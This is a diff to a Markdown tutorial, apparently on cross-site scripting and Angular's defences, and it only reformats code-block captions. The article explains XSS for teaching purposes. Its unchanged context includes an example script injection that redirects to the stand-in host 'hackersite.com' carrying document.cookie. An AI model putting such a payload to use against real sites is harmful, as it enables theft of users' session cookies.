@@ -28,17 +28,13 @@ Like all injection attacks, the lack of context between code and data is the fun
 
 The following example demonstrates a common scenario of XSS. Let's assume your website uses a search function to find all search-term related posts or products. On the result page, the following heading will be displayed when a user searches for 'cats':
 
-_A typical DOM-XSS exposure:_
-
-``` html
+``` html A typical DOM-XSS exposure
 <h1>Search results for <b>cats</b>:</h1>
 ```
 
 But what would happen if a user enters the following piece of code into the search field?
 
-_Simplified code snippet of the XSS attack:_
-
-``` typescript
+``` typescript Simplified code snippet of the XSS attack
 <script>
   alert("I am stealing your cookies!")
   window.location="http://hackersite.com/?cookie" + document.cookie;
@@ -95,9 +91,7 @@ So, you don't have to worry about malicious code? Well, as long as you, as the d
 
 Accessing HTML elements directly in the DOM is strongly discouraged; use Angular's template mechanisms to manipulate the DOM instead. Native web APIs won't receive the built-in Angular protection, leading to a security vulnerability. Especially avoid any document object methods to interact with the HTML file.
 
-_Avoid direct DOM manipulation:_
-
-``` typescript
+``` typescript Avoid direct DOM manipulation
 // Do not use methods like:
 document.getElementById("myHeading").innerHTML = "Hello World!";
 document.getElementById("myLogo").src = "logo.jpg";
@@ -106,9 +100,7 @@ document.getElementById("myList").appendChild(node);
 
 Most applications don't require interacting with HTML elements directly, but if you find yourself in this rare situation, Angular offers its own APIs (for example, the ElementRef API). Only a small percentage of applications really requires this low-level access, so first, make sure if you really can't use templates instead. But be aware, if you are not careful, even Angular's special APIs can quickly lead to XSS vulnerabilities when used to gain access to a direct DOM node and perform manipulations, as shown in this code example:
 
-_Don't use ElementRef to manipulate native DOM elements:_
-
-``` typescript
+``` typescript Don't use ElementRef to manipulate native DOM elements
 @Component({
   selector: 'dangerous',
   template: '<h1 #myHeading></h1>',
